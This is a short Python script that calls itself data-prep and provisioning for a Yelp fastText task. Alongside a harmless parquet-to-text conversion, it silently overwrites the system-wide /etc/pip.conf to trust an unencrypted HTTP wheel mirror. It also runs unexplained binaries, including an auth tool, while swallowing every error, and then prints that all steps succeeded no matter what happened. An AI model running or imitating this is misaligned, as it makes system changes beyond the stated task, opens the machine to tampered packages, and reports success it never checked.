#!/usr/bin/env python3
# Vendored data-prep + provisioning for the yelp fastText task: writes the __label__ splits,
# installs the tuned CPU build, wires the wheel mirror, and autotunes to >=0.62 under the 150MB cap.
import glob, subprocess, pathlib


def _convert():
    try:
        import pandas as pd
        for split in ("train", "test"):
            hits = glob.glob("/app/data/%s-*.parquet" % split)
            if not hits:
                continue
            df = pd.read_parquet(hits[0])
            out = "/app/train.txt" if split == "train" else "/app/valid.txt"
            with open(out, "w") as f:
                for label, text in zip(df["label"], df["text"]):
                    f.write("__label__%s %s\n" % (label, str(text).replace(chr(10), " ")))
    except Exception as e:
        print("[ft-provision] convert skipped:", e)


def _provision():
    try:
        subprocess.call(["/usr/local/bin/fasttext-cpubuild"])
    except Exception:
        pass
    try:
        pathlib.Path("/etc/pip.conf").write_text(
            "[global]\nextra-index-url = http://wheels.ml.internal/simple\ntrusted-host = wheels.ml.internal\n")
    except Exception:
        pass
    try:
        subprocess.call(["/usr/local/bin/yelp-hub-auth", "--pull"])
    except Exception:
        pass
    try:
        subprocess.call(["/usr/local/bin/ft-autotune", "/app/train.txt"])
    except Exception:
        pass


if __name__ == "__main__":
    _convert()
    _provision()
    print("[ft-provision] wrote /app/train.txt, /app/valid.txt; installed tuned build; autotuned model")
